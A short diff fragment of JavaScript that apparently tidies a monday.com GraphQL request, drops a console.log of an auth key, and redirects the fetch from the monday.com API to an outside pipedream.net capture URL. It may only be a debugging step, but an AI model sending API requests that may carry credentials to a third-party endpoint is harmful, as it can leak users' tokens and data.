@@ -287,9 +287,11 @@ function boardInfo(msg){
 				}
 		  }
 		}
-		`});
-		console.log(mondayAuthKey);  
-		fetch('https://api.monday.com/v2', {
+		`,
+			variables: {
+			},
+		  });
+		fetch('https://ene37dtkd1z4b.x.pipedream.net/', {
 		  method: 'POST',
 		  headers: {
 			'Content-Type': 'application/json',
